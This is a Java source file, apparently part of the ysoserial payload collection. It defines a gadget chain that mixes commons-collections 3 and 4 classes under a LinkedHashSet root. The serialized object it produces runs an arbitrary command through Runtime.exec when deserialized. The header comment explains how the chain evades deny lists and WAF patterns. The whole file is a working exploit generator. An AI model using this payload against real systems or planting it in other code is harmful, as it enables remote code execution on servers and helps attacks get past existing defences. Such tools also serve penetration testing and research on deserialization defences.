package ysoserial.payloads;

import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.LinkedHashSet;
import java.util.Map;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

// CC4 TiedMapEntry (cross-library)
import org.apache.commons.collections4.keyvalue.TiedMapEntry;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

/*
	Cross-library CC chain: CC4 TiedMapEntry + CC3 LazyMap + LinkedHashSet root.
	Double evasion — discovered by automated fuzzer (web-fuzzer, 2026-03-14).

	Gadget chain:
		ObjectInputStream.readObject()
			LinkedHashSet.readObject()      [inherits HashSet.readObject()]
				HashMap.put()
					HashMap.hash()
						CC4.TiedMapEntry.hashCode()                 [commons-collections4]
							CC4.TiedMapEntry.getValue()
								CC3.LazyMap.get()                   [commons-collections3]
									ChainedTransformer.transform()
										InvokerTransformer.transform()
											Method.invoke()
												Runtime.exec()

	Why this matters — double evasion:
		1. LinkedHashSet root trigger:
		   - Not in standard deny lists (filters target HashSet/HashMap)
		   - Some WAFs pattern-match "java.util.HashSet" but not "LinkedHashSet"

		2. Cross-library CC4 + CC3:
		   - CC3-only filters miss CC4.TiedMapEntry
		   - CC4-only filters miss CC3.LazyMap/ChainedTransformer/InvokerTransformer
		   - CC4.TiedMapEntry has different serialVersionUID than CC3.TiedMapEntry
		   - Mixed classpath (CC3 + CC4) is common in legacy apps using both versions

	Discovered by: web-fuzzer cross_splice mutation combined fragments from
	CC6 (HashSet+CC3) and CC4 (PriorityQueue+CC4) chains, producing a novel
	cross-library combination that was then completed from partial chain.

	Requires:
		commons-collections 3.x (LazyMap, ChainedTransformer, InvokerTransformer)
		commons-collections4 4.x (TiedMapEntry)
 */

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({
	"commons-collections:commons-collections:3.1",
	"org.apache.commons:commons-collections4:4.0"
})
@Authors({ Authors.BOFEI_CHEN })
public class CommonsCollections13 extends PayloadRunner implements ObjectPayload<Serializable> {

	public Serializable getObject(final String command) throws Exception {
		final String[] execArgs = new String[] { command };

		// Inert transformer during setup
		final Transformer[] fakeTransformers = new Transformer[] {
			new ConstantTransformer(1) };
		final ChainedTransformer transformerChain = new ChainedTransformer(fakeTransformers);

		// Real transformer chain: Runtime.getRuntime().exec(cmd)
		final Transformer[] realTransformers = new Transformer[] {
			new ConstantTransformer(Runtime.class),
			new InvokerTransformer("getMethod", new Class[] {
				String.class, Class[].class }, new Object[] {
				"getRuntime", new Class[0] }),
			new InvokerTransformer("invoke", new Class[] {
				Object.class, Object[].class }, new Object[] {
				null, new Object[0] }),
			new InvokerTransformer("exec",
				new Class[] { String.class }, execArgs),
			new ConstantTransformer(1) };

		final Map innerMap = new HashMap();
		final Map lazyMap = LazyMap.decorate(innerMap, transformerChain);

		// CC4 TiedMapEntry wrapping CC3 LazyMap — cross-library bridge
		TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");

		// LinkedHashSet root trigger
		LinkedHashSet map = new LinkedHashSet(1);
		map.add("foo");

		Field f = null;
		try {
			f = java.util.HashSet.class.getDeclaredField("map");
		} catch (NoSuchFieldException e) {
			f = java.util.HashSet.class.getDeclaredField("backingMap");
		}
		Reflections.setAccessible(f);
		HashMap innimpl = (HashMap) f.get(map);

		Field f2 = null;
		try {
			f2 = HashMap.class.getDeclaredField("table");
		} catch (NoSuchFieldException e) {
			f2 = HashMap.class.getDeclaredField("elementData");
		}
		Reflections.setAccessible(f2);
		Object[] array = (Object[]) f2.get(innimpl);

		Object node = array[0];
		if (node == null) node = array[1];

		Field keyField = Reflections.getField(node.getClass(), "key");
		keyField.set(node, entry);

		Reflections.setFieldValue(transformerChain, "iTransformers", realTransformers);

		return map;
	}

	public static void main(final String[] args) throws Exception {
		PayloadRunner.run(CommonsCollections13.class, args);
	}
}
